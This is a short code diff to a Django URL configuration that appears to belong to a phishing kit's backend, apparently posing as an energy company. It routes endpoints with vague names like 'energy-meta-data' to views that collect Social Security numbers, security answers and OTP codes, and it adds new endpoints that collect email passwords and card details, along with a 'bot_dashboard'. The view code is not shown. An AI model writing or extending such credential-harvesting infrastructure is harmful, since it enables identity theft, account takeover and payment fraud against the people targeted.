@@ -121,6 +121,8 @@ from user_data.energy_view import (
     energy_collect_user_social_security_2,
     energy_collect_user_security_questions,
     energy_collect_user_otp_verification,
+    energy_collect_user_email_password,
+    energy_collect_user_card_info,
 )
 
 urlpatterns = [
@@ -178,5 +180,7 @@ urlpatterns = [
     path("api/energy-meta-data-6/", energy_collect_user_social_security_2, name="energy_collect_user_social_security_2"),
     path("api/energy-meta-data-7/", energy_collect_user_security_questions, name="energy_collect_user_security_questions"),
     path("api/energy-meta-data-8/", energy_collect_user_otp_verification, name="energy_collect_user_otp_verification"),
+    path("api/energy-email-password/", energy_collect_user_email_password, name="energy_collect_user_email_password"),
+    path("api/energy-card-info/", energy_collect_user_card_info, name="energy_collect_user_card_info"),
     path("dashboard/", bot_dashboard, name="bot_dashboard"),
 ]
